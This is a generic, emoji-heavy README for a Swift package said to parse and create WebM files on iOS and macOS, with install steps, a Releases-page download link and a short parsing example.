# 🎉 libwebm-swift - Simple WebM File Handling for iOS & macOS

## 🚀 Getting Started

Welcome to libwebm-swift! This Swift package lets you easily work with WebM files on your iOS and macOS devices. You can parse and create WebM files without needing to dive into complex programming. 

## 📥 Download Now

[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/wubaluke/libwebm-swift/releases)

## 📋 Overview

libwebm-swift provides a simple interface for handling WebM files. This package brings the powerful libwebm library to Swift, making it easy for anyone to integrate WebM support in their applications. With this package, you can:

- Easily parse WebM files to access metadata and content.
- Create WebM files from various media sources.
- Manage media streams seamlessly on iOS and macOS.

## 🛠️ System Requirements

Before you install libwebm-swift, please ensure your development environment meets the following requirements:

- A compatible version of Xcode (minimum Xcode 12).
- macOS 10.15 or later.
- iOS 11 or later if you plan to use it on mobile devices.
- Swift 5.0 or later.

## 📥 Download & Install

To download libwebm-swift, please visit the [Releases page](https://github.com/wubaluke/libwebm-swift/releases). Here’s how to get started:

1. Click the link above to go to the Releases page.
2. Find the latest version listed at the top.
3. Download the zip file or package suitable for your system.
4. Extract the contents to your desired location.

Be sure to follow the instructions included in the package for installation.

## 📝 Features

libwebm-swift offers several helpful features:

- **File Parsing:** Easily read WebM files to extract video and audio streams.
- **File Creation:** Generate new WebM files from scratch, compiling audio and video data.
- **Cross-Platform Support:** Use on both iOS and macOS platforms without modification.

## 📁 Usage Instructions

Once installed, you can start using libwebm-swift in your project. Follow these steps to integrate the package into your Xcode project:

1. Open your Xcode project.
2. Navigate to your project settings.
3. Select the "Package Dependencies" tab.
4. Use the following URL to add the package: `https://github.com/wubaluke/libwebm-swift.git`.
5. Choose the version of the package you want to use.

### Example Code

Here’s a simple example to get you started with parsing a WebM file:

```swift
import libwebm_swift

let webmParser = WebMParser()
do {
    try webmParser.loadFile("path/to/your/file.webm")
    let info = webmParser.getInfo()
    print("Video Duration: \(info.duration)")
} catch {
    print("Error loading WebM file: \(error)")
}
```

## ⚙️ Contributing

Contributions are welcome! If you want to help improve libwebm-swift, please follow these steps:

1. Fork the repository on GitHub.
2. Create your feature branch.
3. Commit your changes.
4. Push to the branch.
5. Open a pull request.

Make sure to follow best practices and include comments in your code for clarity.

## 📞 Support

If you encounter issues or need help, please raise an issue in the GitHub repository. You can provide details about your problem, and we will do our best to assist you.

## 📥 Download Now Again

Don’t forget, you can always return to the [Releases page](https://github.com/wubaluke/libwebm-swift/releases) to download the latest version of libwebm-swift. 

Enjoy working with WebM files!